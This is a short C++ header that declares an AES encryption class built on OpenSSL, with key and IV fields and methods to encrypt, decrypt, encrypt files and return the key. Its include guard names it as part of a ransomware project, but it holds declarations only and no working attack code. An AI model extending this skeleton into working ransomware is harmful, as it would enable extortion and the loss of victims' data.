//
// Created on 23.01.20.
//

#ifndef RANSOMWARE_AES_ALGO_H
#define RANSOMWARE_AES_ALGO_H

#include <openssl/aes.h>
#include <openssl/rand.h>
#include "crypto.h"

class AESAlgorithm : public Crypto {
private:
    EVP_CIPHER_CTX *_encCTX;
    EVP_CIPHER_CTX *_decCTX;
    unsigned char _key[32], _iv[32];
    int _initRounds;

    void init(unsigned char *keyData, unsigned char *salt);
public:
    AESAlgorithm(int initRounds=5);
    ~AESAlgorithm();

    void start();
    unsigned char *getKey();
    int encrypt(unsigned char *plaintext, int plaintextLen, unsigned char *ciphertext);
    int decrypt(unsigned char *ciphertext, int ciphertextLen, unsigned char *plaintext);

    void encryptFile();
    void decryptFile();
    void print_hex(unsigned char *str, int len);

};


#endif //RANSOMWARE_AES_ALGO_H
